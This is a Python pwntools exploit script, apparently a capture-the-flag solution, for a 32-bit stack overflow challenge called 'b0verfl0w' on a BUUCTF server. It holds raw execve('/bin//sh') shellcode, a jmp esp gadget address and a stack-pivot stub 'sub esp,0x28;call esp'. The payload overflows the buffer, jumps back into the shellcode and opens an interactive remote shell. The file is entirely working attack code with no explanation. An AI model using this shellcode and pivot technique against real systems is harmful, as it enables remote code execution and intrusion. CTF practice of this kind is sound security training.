#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.01 19.06.45
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'i386'


host = 'node3.buuoj.cn'
port = 28080
local = 0
if local:
	context.log_level = 'debug'
	# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('./b0verfl0w')
	sh = process('./b0verfl0w')
else:
	#context.log_level = 'debug'
	# libc=ELF('null')
	elf = ELF('./b0verfl0w')
	sh = remote(host,port)



def pwn():
	JmpEsp = 0x08048504
	start = 0x08048400
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

	payload = shellcode.ljust(0x20,'\x90') + p32(0xdeadbeef) + p32(JmpEsp) + asm("sub esp,0x28;call esp") + '\x00\n'
	# gdb.attach(sh)
	sh.send(payload)

if __name__ == '__main__':
	pwn()
	sh.interactive()

